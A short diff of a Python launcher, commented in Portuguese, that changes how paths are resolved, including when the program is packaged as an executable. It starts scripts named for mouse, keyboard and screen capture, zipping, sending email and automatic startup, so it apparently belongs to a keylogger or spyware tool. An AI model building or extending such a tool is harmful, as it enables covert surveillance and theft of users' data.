@@ -4,8 +4,18 @@ import sys
 import os
 import webbrowser
 
-# Lista de scripts a serem executados
-scripts = ['mouse.py', 'teclado.py', 'tela.py', 'Zip.py', 'send_email.py', 'inicializacao_automatica.py']
+# Obtendo o caminho base
+base_path = os.path.dirname(__file__) if getattr(sys, 'frozen', False) else os.path.abspath(".")
+
+# Caminhos dos scripts
+scripts = [
+    os.path.join(base_path, 'mouse.py'),
+    os.path.join(base_path, 'teclado.py'),
+    os.path.join(base_path, 'tela.py'),
+    os.path.join(base_path, 'Zip.py'),
+    os.path.join(base_path, 'send_email.py'),
+    os.path.join(base_path, 'inicializacao_automatica.py')
+]
 
 def signal_handler(sig, frame):
     print('Interrompendo os processos...', file=sys.stderr)
